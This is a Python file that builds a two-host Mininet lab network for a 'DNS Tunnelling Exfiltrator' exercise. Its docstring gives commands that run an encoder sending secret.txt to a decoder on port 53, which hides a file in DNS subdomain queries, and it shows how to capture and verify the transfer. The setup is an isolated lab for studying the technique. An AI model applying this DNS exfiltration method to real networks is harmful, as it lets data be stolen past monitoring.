#!/usr/bin/env python3
"""LAB ONLY Mininet topology for the DNS Tunnelling Exfiltrator.

    sudo mn --custom dns_topo.py --topo dnstun --test pingall
    # or interactively: sudo mn --custom dns_topo.py --topo dnstun
    #   mininet> h2 sudo python3 decoder.py --host 10.0.0.2 --port 53 &
    #   mininet> h1 python3 encoder.py secret.txt --server 10.0.0.2 --port 53
    #   (run the server FIRST, and create secret.txt on h1 yourself)

One switch, two hosts, private 10.0.0.0/24 — the same shape as your
ChameleonNet smoke-test topology, so it reuses what you already proved:
  h1  10.0.0.1  sender   ("victim" — your own host, your own test file)
  h2  10.0.0.2  receiver (authoritative for dnstunnel.cc.cd in this lab only)

Proof step (your demo evidence): on h2, before running the sender,
    sudo tcpdump -i h2-eth0 -n udp port 53
and you will literally see 001.xxx.dnstunnel.cc.cd, 002.xxx.dnstunnel.cc.cd, ...
arrive. Compare original vs rebuilt with:
    sha256sum secret.txt recovered_secret.txt
"""

from mininet.topo import Topo


class DnsTunTopo(Topo):
    def build(self):
        switch = self.addSwitch("s1")
        h1 = self.addHost("h1", ip="10.0.0.1/24")
        h2 = self.addHost("h2", ip="10.0.0.2/24")
        self.addLink(h1, switch)
        self.addLink(h2, switch)


topos = {"dnstun": DnsTunTopo}
